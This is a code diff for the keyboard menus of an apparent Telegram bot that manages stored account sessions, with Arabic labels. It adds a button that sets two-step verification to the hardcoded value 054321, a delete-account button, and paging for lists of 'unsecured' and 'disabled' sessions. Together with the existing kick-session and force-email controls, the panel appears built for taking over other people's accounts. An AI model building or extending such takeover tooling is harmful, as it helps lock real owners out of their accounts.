@@ -24,6 +24,7 @@ CB = {
     "kick_only": "ks",
     "kick_spec": "kp",
     "forcemail": "fm",
+    "direct_2fa": "df",
     "verify": "v",
 }
 
@@ -287,7 +288,7 @@ def user_messages_menu_keyboard() -> InlineKeyboardMarkup:
     ])
 
 
-def session_detail_keyboard(session_id: int, page: int = 0, is_super_admin: bool = False) -> InlineKeyboardMarkup:
+def session_detail_keyboard(session_id: int, page: int = 0, is_super_admin: bool = False, source: str = "main") -> InlineKeyboardMarkup:
     buttons = [
         [
             InlineKeyboardButton(
@@ -325,6 +326,10 @@ def session_detail_keyboard(session_id: int, page: int = 0, is_super_admin: bool
             text="🔐 تعيين/تغيير التحقق بخطوتين",
             callback_data=cb("twofa", session_id),
         )],
+        [InlineKeyboardButton(
+            text="🔐 تغيير تحقق 054321",
+            callback_data=cb("direct_2fa", session_id),
+        )],
         [
             InlineKeyboardButton(
                 text="🚫 طرد الجلسات فقط",
@@ -336,10 +341,20 @@ def session_detail_keyboard(session_id: int, page: int = 0, is_super_admin: bool
     if is_super_admin:
         buttons.append([
             InlineKeyboardButton(
+                text="⭐ إضافة/إزالة من النجمة",
+                callback_data=cb("hide", session_id),
+            ),
+            InlineKeyboardButton(
                 text="📱 طرد جلسة معينة",
                 callback_data=cb("kick_spec", session_id),
             )
         ])
+
+    back_cb = f"sessions_page_{page}"
+    if source == "unsecured":
+        back_cb = f"unsecured_page_{page}"
+    elif source == "disabled":
+        back_cb = f"disabled_page_{page}"
 
     buttons.extend([
         [InlineKeyboardButton(
@@ -347,8 +362,12 @@ def session_detail_keyboard(session_id: int, page: int = 0, is_super_admin: bool
             callback_data=cb("kick", session_id),
         )],
         [InlineKeyboardButton(
+            text="� إزالة الحساب نهائياً",
+            callback_data=cb("delete", session_id),
+        )],
+        [InlineKeyboardButton(
             text="🔙 رجوع للقائمة",
-            callback_data=f"sessions_page_{page}",
+            callback_data=back_cb,
         )],
     ])
     return InlineKeyboardMarkup(inline_keyboard=buttons)
@@ -360,15 +379,32 @@ def back_to_session_keyboard(session_id: int) -> InlineKeyboardMarkup:
     ])
 
 
-def unsecured_sessions_keyboard(sessions) -> InlineKeyboardMarkup:
+def unsecured_sessions_keyboard(sessions, page: int = 0, per_page: int = 10) -> InlineKeyboardMarkup:
+    total = len(sessions)
+    start = page * per_page
+    end = start + per_page
+    page_sessions = sessions[start:end]
+
     buttons = []
-    for s in sessions:
+    for s in page_sessions:
         sid = s["id"]
         label = _session_label(s)
         buttons.append([
             InlineKeyboardButton(text=label, callback_data=cb("session", sid))
         ])
     
+    nav = []
+    if page > 0:
+        nav.append(InlineKeyboardButton(
+            text="◀️ السابق", callback_data=f"unsecured_page_{page - 1}"
+        ))
+    if end < total:
+        nav.append(InlineKeyboardButton(
+            text="التالي ▶️", callback_data=f"unsecured_page_{page + 1}"
+        ))
+    if nav:
+        buttons.append(nav)
+
     if sessions:
         buttons.append([
             InlineKeyboardButton(
@@ -383,9 +419,14 @@ def unsecured_sessions_keyboard(sessions) -> InlineKeyboardMarkup:
     return InlineKeyboardMarkup(inline_keyboard=buttons)
 
 
-def disabled_sessions_keyboard(sessions) -> InlineKeyboardMarkup:
+def disabled_sessions_keyboard(sessions, page: int = 0, per_page: int = 10) -> InlineKeyboardMarkup:
+    total = len(sessions)
+    start = page * per_page
+    end = start + per_page
+    page_sessions = sessions[start:end]
+
     buttons = []
-    for s in sessions:
+    for s in page_sessions:
         sid = s["id"]
         label = _session_label(s)
         buttons.append([
@@ -393,6 +434,18 @@ def disabled_sessions_keyboard(sessions) -> InlineKeyboardMarkup:
             InlineKeyboardButton(text="🗑", callback_data=cb("delete", sid))
         ])
     
+    nav = []
+    if page > 0:
+        nav.append(InlineKeyboardButton(
+            text="◀️ السابق", callback_data=f"disabled_page_{page - 1}"
+        ))
+    if end < total:
+        nav.append(InlineKeyboardButton(
+            text="التالي ▶️", callback_data=f"disabled_page_{page + 1}"
+        ))
+    if nav:
+        buttons.append(nav)
+
     buttons.append([
         InlineKeyboardButton(text="🔙 رجوع", callback_data="back_to_sessions")
     ])
